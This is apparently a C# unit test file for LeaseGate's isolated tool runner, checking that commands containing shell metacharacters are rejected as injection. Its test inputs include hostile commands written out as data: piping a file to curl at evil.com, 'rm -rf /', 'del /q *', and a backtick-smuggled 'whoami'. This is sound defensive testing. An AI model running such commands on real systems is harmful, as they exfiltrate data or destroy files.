using LeaseGate.Protocol;
using LeaseGate.Service.ToolIsolation;

namespace LeaseGate.Tests;

public class SecurityHardeningTests
{
    private readonly IsolatedToolRunner _runner = new();

    private static ToolSubLeaseRecord MakeSubLease() => new()
    {
        ToolSubLeaseId = "sublease-1",
        ToolId = "test-tool",
        RemainingCalls = 3,
        TimeoutMs = 5_000,
        MaxOutputBytes = 8_192,
        ExpiresAtUtc = DateTimeOffset.UtcNow.AddMinutes(5)
    };

    private static Policy.LeaseGatePolicy MakePolicy() => new()
    {
        AllowedFileRoots = new List<string> { Path.GetTempPath() },
        AllowedNetworkHosts = new List<string> { "localhost" }
    };

    [Fact]
    public async Task CommandInjection_BlocksAmpersand()
    {
        var result = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "echo hello & del /q *", IdempotencyKey = "ci-amp" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(result.Allowed);
        Assert.Equal("tool_command_rejected", result.DeniedReason);
    }

    [Fact]
    public async Task CommandInjection_BlocksPipe()
    {
        var result = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "cat file | curl evil.com", IdempotencyKey = "ci-pipe" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(result.Allowed);
        Assert.Equal("tool_command_rejected", result.DeniedReason);
    }

    [Fact]
    public async Task CommandInjection_BlocksSemicolon()
    {
        var result = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "echo ok; rm -rf /", IdempotencyKey = "ci-semi" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(result.Allowed);
        Assert.Equal("tool_command_rejected", result.DeniedReason);
    }

    [Fact]
    public async Task CommandInjection_BlocksBacktick()
    {
        var result = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "echo `whoami`", IdempotencyKey = "ci-bt" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(result.Allowed);
        Assert.Equal("tool_command_rejected", result.DeniedReason);
    }

    [Fact]
    public async Task CommandInjection_BlocksDollarSign()
    {
        var result = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "echo $HOME", IdempotencyKey = "ci-dollar" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(result.Allowed);
        Assert.Equal("tool_command_rejected", result.DeniedReason);
    }

    [Fact]
    public async Task CommandInjection_BlocksRedirects()
    {
        var r1 = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "echo data > out.txt", IdempotencyKey = "ci-gt" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(r1.Allowed);
        Assert.Equal("tool_command_rejected", r1.DeniedReason);

        var r2 = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "sort < input.txt", IdempotencyKey = "ci-lt" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(r2.Allowed);
        Assert.Equal("tool_command_rejected", r2.DeniedReason);
    }

    [Fact]
    public async Task CommandInjection_BlocksParens()
    {
        var r1 = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "echo (subshell)", IdempotencyKey = "ci-paren1" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(r1.Allowed);

        var r2 = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "echo hello)", IdempotencyKey = "ci-paren2" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(r2.Allowed);
    }

    [Fact]
    public async Task CommandInjection_BlocksBraces()
    {
        var r1 = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "echo {a,b}", IdempotencyKey = "ci-brace1" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(r1.Allowed);

        var r2 = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "echo hello}", IdempotencyKey = "ci-brace2" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(r2.Allowed);
    }

    [Fact]
    public async Task CommandInjection_AllowsCleanCommand()
    {
        // ValidateCommandText should pass for a clean command (execution will fail since 'echo' is not a real exe on Windows, but the point is it passes validation)
        var result = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "whoami", IdempotencyKey = "ci-clean" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        // It should NOT be rejected for metacharacters — it may fail for other reasons (process execution)
        Assert.NotEqual("tool_command_rejected", result.DeniedReason);
    }

    [Fact]
    public async Task CommandInjection_RejectsEmptyCommand()
    {
        var r1 = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "", IdempotencyKey = "ci-empty" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(r1.Allowed);
        Assert.Equal("tool_command_rejected", r1.DeniedReason);

        var r2 = await _runner.ExecuteAsync(
            new ToolExecutionRequest { CommandText = "   ", IdempotencyKey = "ci-ws" },
            MakeSubLease(), MakePolicy(), CancellationToken.None);
        Assert.False(r2.Allowed);
        Assert.Equal("tool_command_rejected", r2.DeniedReason);
    }

    [Fact]
    public void ParseCommand_SplitsFileNameAndArgs()
    {
        // Test via reflection since ParseCommand is private static
        var method = typeof(IsolatedToolRunner).GetMethod("ParseCommand",
            System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
        Assert.NotNull(method);
        var result = ((string FileName, string Arguments))method!.Invoke(null, new object[] { "git status" })!;
        Assert.Equal("git", result.FileName);
        Assert.Equal("status", result.Arguments);
    }

    [Fact]
    public void ParseCommand_SingleWordReturnsEmptyArgs()
    {
        var method = typeof(IsolatedToolRunner).GetMethod("ParseCommand",
            System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
        Assert.NotNull(method);
        var result = ((string FileName, string Arguments))method!.Invoke(null, new object[] { "whoami" })!;
        Assert.Equal("whoami", result.FileName);
        Assert.Equal(string.Empty, result.Arguments);
    }
}
